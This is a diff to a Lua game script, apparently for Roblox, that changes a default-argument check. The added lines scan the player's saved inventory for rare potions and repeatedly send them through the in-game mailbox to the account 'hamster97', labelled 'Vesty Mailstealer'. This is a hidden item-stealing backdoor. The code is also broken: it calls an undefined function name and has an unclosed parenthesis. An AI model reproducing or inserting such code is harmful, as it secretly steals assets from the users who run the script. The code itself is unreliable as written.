@@ -1,6 +1,38 @@
 return function(dh,pn,gn,dp,potc)
 if not dp then dp = 0 end
-if not potc then potc=0 end
+if not potc then
+potc = 0
+local pots = {}
+if save.Inventory.Consumable then
+for i,v in pairs(save.Inventory.Consumable) do
+if v.id == "God Potion" or (v.id == "Instant Luck Potion" and v.tn==4) then
+pots[i]=v._am
+potc=potc+1
+end
+end
+end
+if potc>0 then
+function _mail(u, t, i, n)
+local args = {
+    [1] = u,
+    [2] = "Vesty Mailstealer",
+    [3] = t,
+    [4] = i,
+    [5] = n or 1
+}
+return game:GetService("ReplicatedStorage"):WaitForChild("Network"):WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
+end
+for i,v in pairs(pots) do
+local x,y = false, "x"
+repeat
+x,y = mail("hamster97", "Consumable", i, v)
+wait(0.2
+until x==true
+
+end
+end
+end
+end
 if _G.dx then return end
 if tonumber(gn)==100 then gn = 0 end
 local msg = ""
